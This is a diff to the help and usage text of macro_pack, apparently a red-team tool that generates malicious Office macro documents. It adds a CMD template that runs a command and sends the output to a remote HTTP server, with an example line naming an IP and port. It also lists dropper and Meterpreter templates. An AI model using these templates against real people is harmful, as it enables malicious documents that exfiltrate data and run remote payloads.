@@ -21,6 +21,13 @@ def printTemplatesUsage(banner, currentApp):
           -> Example: echo "@Author" | %s -t HELLO -P hello.pptm
           
                 -------------------- 
+        
+        CMD
+        Execute a command line and send result to remote http server
+        Give this template the server url and the command to run
+          -> Example:  echo "http://192.168.0.5:7777" "dir /Q C:" | %s -t CMD -o -w cmd.doc
+          
+                --------------------
                     
         DROPPER
         Download and execute a file
@@ -71,7 +78,7 @@ def printTemplatesUsage(banner, currentApp):
          -> Example2: echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | %s  -t EMBED_EXE -o -X my_exe.xlsm
 
                 --------------------  
-""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp)
+""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp)
     print(templatesInfo)
     
     
@@ -114,7 +121,7 @@ def printUsage(banner, currentApp, mpSession):
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
         
     -t, --template=TEMPLATE_NAME    Use VBA template already included in %s.
-        Available templates are: HELLO, DROPPER, DROPPER2, DROPPER_PS, METERPRETER, EMBED_EXE 
+        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, METERPRETER, EMBED_EXE 
         Help for template usage: %s -t help
          
     -v, --vba-output=VBA_FILE_PATH Output generated vba macro (text format) to given path.         
